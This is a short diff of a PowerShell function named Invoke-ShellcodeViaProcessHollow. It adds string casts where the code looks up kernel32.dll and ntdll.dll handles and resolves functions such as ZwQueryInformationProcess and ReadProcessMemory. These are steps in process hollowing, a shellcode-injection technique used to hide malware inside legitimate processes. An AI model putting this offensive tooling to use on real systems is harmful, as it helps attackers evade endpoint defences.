@@ -151,8 +151,8 @@ function Invoke-ShellcodeViaProcessHollow
 
     # Get all of our address pointers to our needed functions.
 
-    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
-    $NtdllHandle                        = $GetModuleHandle.Invoke($null, @("ntdll.dll"))
+    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
+    $NtdllHandle                        = $GetModuleHandle.Invoke($null, @([String] "ntdll.dll"))
 
     $ZwQueryInformationProcessAddress   = $GetProcAddress.Invoke($null, @($NtdllHandle,    "ZwQueryInformationProcess"))
     $ReadProcessMemoryAddress           = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ReadProcessMemory"))
